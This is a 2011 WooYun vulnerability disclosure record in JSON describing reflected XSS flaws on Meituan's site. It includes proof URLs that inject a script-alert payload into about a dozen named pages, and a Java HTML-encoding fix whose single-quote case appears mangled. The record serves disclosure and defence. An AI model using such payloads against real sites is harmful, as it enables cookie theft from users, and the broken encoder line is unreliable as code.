{"id": 22920, "wybug_id": "wooyun-2011-02057", "wybug_title": "美团网存在多个反射型XSS", "wybug_corp": "美团网", "wybug_author": "eke", "wybug_date": "2011-05-05 15:16", "wybug_open_date": "2011-05-06 10:51", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-05-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-05-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 美团网存在多个反射型的XSS漏洞，该漏洞是由于没有对用户输入进行验证导致的。攻击者利用该漏洞，可能盗取用户Cookie。 详细说明：  美团网以下页面存在反射型XSS：http://www.meituan.com/http://www.meituan.com/index/http://www.meituan.com/index/?province=110000http://www.meituan.com/about/http://www.meituan.com/about/privacy/http://www.meituan.com/feedback/http://www.meituan.com/mobile/http://www.meituan.com/merchants/http://www.meituan.com/account/referrals/http://www.meituan.com/account/signup/http://www.meituan.com/help/api/   漏洞证明：  \nhttp://www.meituan.com///\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/index//\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/index/?province=110000\"></a><script>alert(/xss/)</script>&city=bj\n\n\n\nhttp://www.meituan.com/about//\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/about/privacy/\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/feedback//\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/mobile//\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/merchants//\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/account/referrals/\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/account/signup/\"></a><script>alert(/xss/)</script>\n\n\n\nhttp://www.meituan.com/help/api/\"></a><script>alert(/xss/)</script>\n\n\n   修复方案：  在ASP/ASP.net中，可以使用：\nServer.HTMLEncode(strHTML String)\n在Java中，可以使用：\npublic static String HTMLEncode(String aTagFragment){ final StringBuffer result = new StringBuffer(); final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); char character = iterator.current(); while (character != StringCharacterIterator.DONE ){ if (character == '<') { result.append(\"&lt;\"); } else if (character == '>') { result.append(\"&gt;\"); } else if (character == '\\\"') { result.append(\"&quot;\"); } else if (character == '\\\") { result.append(\"&#039;\"); } else if (character == '\\\\') { result.append(\"&#092;\"); } else if (character == '&') { result.append(\"&amp;\"); } else { // 如果字符不是特殊字符，则直接添加到结果中 result.append(character); } character = iterator.next(); } return result.toString(); }\n   版权声明：转载请注明来源 eke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：3 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 3, "Ranks": null}